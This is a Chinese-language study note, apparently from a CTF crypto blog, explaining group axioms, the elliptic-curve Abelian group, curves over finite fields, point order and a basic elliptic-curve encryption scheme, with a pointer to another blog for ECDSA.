<h2 id="椭圆曲线阿贝尔群"><a href="#椭圆曲线阿贝尔群" class="headerlink" title="椭圆曲线阿贝尔群"></a>椭圆曲线阿贝尔群</h2><p>为了让椭圆曲线上的点之间建立联系</p>
<h3 id="关于群的一些知识"><a href="#关于群的一些知识" class="headerlink" title="关于群的一些知识"></a>关于群的一些知识</h3><p>群是一种代数结构，由一个集合以及一个二元运算组成</p>
<p>已知集合$G$和运算$+$（不一定就是加法），则群满足</p>
<ul>
<li><strong>封闭性</strong>：$\forall a,\ b\in G,\ a+b\in G$</li>
<li><strong>结合性</strong>：$\forall a,\ b,\ c\in G,\ (a+b)+c=a+(b+c)$</li>
<li><strong>单位元</strong>：$\exists e\in G,\ \forall a\in G$，有$e+a=a+e=a$</li>
<li><strong>逆元</strong>：$\forall a\in G,\ \exists b\in G$，使得$a+b=b+a=e$</li>
<li><strong>交换性</strong>：$\forall a,\ b\in G,\ a+b=b+a$</li>
</ul>
<h3 id="椭圆曲线阿贝尔群-1"><a href="#椭圆曲线阿贝尔群-1" class="headerlink" title="椭圆曲线阿贝尔群"></a>椭圆曲线阿贝尔群</h3><p>取椭圆曲线上两点P、Q的连线，（若重合就做该点的切线），交曲线于点R’，过R’做y轴的平行线交椭圆曲线于另外一点，记为R</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20180925194717883" alt="椭圆曲线阿贝尔群"></p>
<p>定义<br>$$<br>P+Q=R<br>$$<br>满足交换律、结合律</p>
<h2 id="有限域椭圆曲线"><a href="#有限域椭圆曲线" class="headerlink" title="有限域椭圆曲线"></a>有限域椭圆曲线</h2><p>连续的不适合计算机，计算机就是基于离散数学发展的；将椭圆曲线变成离散的点就是，有限域椭圆曲线</p>
<p>我们给出有限域$GF(p)$</p>
<ul>
<li>$GF(p)$中有$p$个元素</li>
<li>加法是$a+b\equiv c\ (mod\ p)$</li>
<li>乘法是$a\times b\equiv c\ (mod\ p)$</li>
<li>除法是$a\times a^{-1}\equiv 1\ (mod\ p)$</li>
<li>单位元是1，零元是0</li>
<li>满足交换律、结合律、分配律</li>
</ul>
<p><strong>有限域椭圆曲线</strong>$Ep(a,\ b)$，$p$为质数，$x,\ y \in [0,\ p-1]$，满足<br>$$<br>y^2=x^3+ax+b\ (mod\ p)<br>$$<br>其中$4a^3+27b^2\ne 0\ (mod\ p)$</p>
<p>有限域上的椭圆曲线满足</p>
<ul>
<li><p>无穷远点$O_\infty$为零元，$O_\infty+O_\infty=O_\infty$，$O_\infty+P=P$</p>
</li>
<li><p>$Ep(x,\ y)$的负元是$(x,\ -y\ mod\ p)=(x,\ p-y)$，有$P+(-P)=O_\infty$</p>
</li>
<li><p>$R=P+Q$，它们三点的坐标满足一定的关系（懒得打了，这个后面可以用来计算）</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211021165719696.png" alt="image-20211021165719696"></p>
</li>
</ul>
<h2 id="有限域椭圆曲线点的阶"><a href="#有限域椭圆曲线点的阶" class="headerlink" title="有限域椭圆曲线点的阶"></a>有限域椭圆曲线点的阶</h2><p>如果椭圆曲线上的一点$P$，存在最小的正整数$n$，使得$n\times P=O_\infty$，则$n$称为$P$的阶</p>
<p>否则，$P$无限阶</p>
<h2 id="椭圆曲线加密"><a href="#椭圆曲线加密" class="headerlink" title="椭圆曲线加密"></a>椭圆曲线加密</h2><ul>
<li><p>用户A选一条椭圆曲线$Ep(a,\ b)$，取一点$G$作为基点</p>
</li>
<li><p>A选择一个随机数数$k$作为私钥，计算公钥$K=kG$</p>
</li>
<li><p>A公布$Ep(a,\ b),\ K,\ G$</p>
</li>
<li><p>用户B用A的公钥加密，用明文$M$（上面说编码到椭圆曲线上，没了解）以及产生的一个随机数$r$计算</p>
<p>$C_1=M+rK$</p>
<p>$C_2=rG$</p>
<p>并传给A</p>
</li>
<li><p>A计算$M=C_1-kC_2$解密</p>
</li>
</ul>
<p>所以椭圆曲线的困难问题就是，知道$K,\ G$，不能得到随机数数$k$吧</p>
<h1 id="ECDSA"><a href="#ECDSA" class="headerlink" title="ECDSA"></a>ECDSA</h1><p>流程暂时看la佬博客吧，比赛中遇到的</p>
<p><a href="https://4xwi11.github.io/posts/90e286aa/">https://4xwi11.github.io/posts/90e286aa/</a></p>
]]></content>
      <categories>
        <category>CTF-Crypto</category>
        <category>Crypto-TopologyTree</category>
      </categories>
      <tags>
        <tag>ECC</tag>
      </tags>
  </entry>
</search>
